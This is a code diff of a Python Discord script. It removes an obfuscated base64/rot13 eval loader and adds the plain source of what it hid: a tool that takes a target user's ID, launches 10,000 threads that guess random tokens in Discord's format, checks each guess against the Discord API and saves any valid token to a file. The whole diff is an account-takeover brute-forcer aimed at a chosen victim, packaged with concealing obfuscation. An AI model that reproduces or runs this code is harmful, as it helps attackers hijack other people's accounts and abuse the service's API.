@@ -1,11 +1,50 @@
-import base64, codecs
-magic = 'aW1wb3J0IGRpc2NvcmQKaW1wb3J0IHN0cmluZwppbXBvcnQgcmVxdWVzdHMgYXMgcmVxCmltcG9ydCBkYXRldGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCB0aW1lCmltcG9ydCBiYXNlNjQKZnJvbSB0aHJlYWRpbmcgaW1wb3J0IFRocmVhZCBhcyB0aHIKaW1wb3J0IG9zCmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUgYXMgQwppbXBvcnQgZGlzY29yZCwgb3MsIGpzb24KZnJvbSBkaXNjb3JkLmV4dCBpbXBvcnQgY29tbWFuZHMKZnJvbSBkaXNjb3JkLmV4dC5jb21tYW5kcyBpbXBvcnQgQm90CgoKCmNsYXNzIE15Q2xpZW50KGRpc2NvcmQuQ2xpZW50KToKICBhc3luYyBkZWYgb25fcmVhZHkoc2VsZik6CiAgICB1c2VyaWQgPSBpbnB1dChmIntDLlJFRH1QbGVhc2UgcGFzdGUgdGhlIHRhcmdldCdzIElEIGhlcmUge0MuUkVE'
-love = 'sGbtr0ZhHxIRsFVcPvNtVPO1p2IlVQ0tLKqunKDtL2kcMJ50YzMyqTAbK3ImMKVbnJ50XUImMKWcMPxcPvNtVPOmqTSgpPN9VUImMKVhL3WyLKEyMS9uqNbtVPNtqTygMKA0LJ1jVQ0tp3ElXUEcoJHhoJg0nJ1yXUA0LJ1jYaEcoJI0qKOfMFtcXFxXVPNtVUOlnJ50XUEcoJImqTSgpPxXVPNtVTIhL29xMJEPrKEyplN9VTWup2H2AP5vAwEyozAiMTHbqKAypzyxYzIhL29xMFtvqKEzYGtvXFxXVPNtVTIhL29xMJEcMPN9VUA0pvuyozAiMTIxDay0MKZfVPW1qTLgBPVcPvNtVPOyozAiMTIxDay0MKZtCFOvLKAyAwDhLwL0MJ5wo2EyXUEcoJImqTSgpP5yozAiMTHbVaI0Mv04VvxcPvNtVPOyozAiMTIxp3EuoKNtCFOmqUVbMJ5wo2EyMRW5qTImYPNvqKEzYGtvXDbtVPNtpUWcoaDbMvW7Dl5KFRyHEK1OqUEyoKO0nJ5aVUEiVTAl'
-god = 'YWNrIHtDLllFTExPV317dXNlcn17Qy5XSElURX0ncyB0b2tlbiIpCiAgICBmb3IgaSBpbiByYW5nZSgxMDAwMCk6CiAgICAgIHRocih0YXJnZXQgPSBnZW4sIGFyZ3MgPSAoZW5jb2RlZGlkLCBlbmNvZGVkc3RhbXApKS5zdGFydCgpCgpkZWYgZ2VuKGVuY29kZWRpZCwgZW5jb2RlZHN0YW1wKToKICB3aGlsZSBUcnVlOgogICAgc2Vjb25kID0gKCcnKS5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cyArICItIiArICJfIiwgaz02KSkKICAgIGVuZCA9ICgnJykuam9pbihyYW5kb20uY2hvaWNlcyhzdHJpbmcuYXNjaWlfbGV0dGVycyArIHN0cmluZy5kaWdpdHMgKyAiLSIgKyAiXyIsIGs9MjcpKQogICAgdG9rZW4gPSBmIntlbmNvZGVkaWR9LntzZWNvbmR9LntlbmR9Igog'
-destiny = 'VPNtnTIuMTIlplN9VUfaD29hqTIhqP1HrKOyWmbtW2SjpTkcL2S0nJ9hY2cmo24aYPNaLKI0nT9lnKcuqTyiovp6VUEin2IhsDbtVPNtqKWfVQ0tVzu0qUOmBv8iMTymL29lMTSjpP5wo20iLKOcY3L2Y3ImMKWmY0OgMF9fnJWlLKW5VtbtVPNtpvN9VUWypF5aMKDbqKWfYPObMJSxMKWmCJuyLJEypaZcPvNtVPOcMvOlYaA0LKE1p19wo2EyVQ09VQVjZQbXVPNtVPNtVPOjpzyhqPuzW3gQYyqVFIESsKg0o2gyoa0tr0ZhDxkOD0g9BvO7Dl5PGSISsIMuoTyxWlxXVPNtVPNtVPOzVQ0to3OyovtvqT9eMJ5mYaE4qPVfVPWuVvxXVPNtVPNtVPOzYaqlnKEyXUEin2IhXDbtVPNtVPNtVTLhL2kip2HbXFNXVPNtVTIfp2H6PvNtVPNtVPNtpUWcoaDbMvq7Dl5KFRyHEK17qT9eMJ59VUgQYxWZDHAYsGbtr0ZhHxIRsHyhqzSfnJDaXDb='
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+import discord
+import string
+import requests as req
+import datetime
+import random
+import time
+import base64
+from threading import Thread as thr
+import os
+from colorama import Fore as C
+import discord, os, json
+from discord.ext import commands
+from discord.ext.commands import Bot
+
+
+
+class MyClient(discord.Client):
+  async def on_ready(self):
+    userid = input(f"{C.RED}Please paste the target's ID here {C.RED}: {C.RED}")
+    user = await client.fetch_user(int(userid))
+    stamp = user.created_at
+    timestamp = str(time.mktime(stamp.timetuple()))
+    print(timestamp)
+    encodedBytes = base64.b64encode(userid.encode("utf-8"))
+    encodedid = str(encodedBytes, "utf-8")
+    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
+    encodedstamp = str(encodedBytes, "utf-8")
+    print(f"{C.WHITE}Attempting to crack {C.YELLOW}{user}{C.WHITE}'s token")
+    for i in range(10000):
+      thr(target = gen, args = (encodedid, encodedstamp)).start()
+
+def gen(encodedid, encodedstamp):
+  while True:
+    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
+    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
+    token = f"{encodedid}.{second}.{end}"
+    headers = {'Content-Type': 'application/json', 'authorization': token}
+    url = "https://discordapp.com/api/v6/users/@me/library"
+    r = req.get(url, headers=headers)
+    if r.status_code == 200:
+        print(f'{C.WHITE}{token} {C.BLACK}: {C.BLUE}Valid')
+        f = open("tokens.txt", "a")
+        f.write(token)
+        f.close() 
+    else:
+        print(f'{C.WHITE}{token} {C.BLACK}: {C.RED}Invalid')
+
 
 token = os.environ.get("TOKEN")
 client = MyClient()
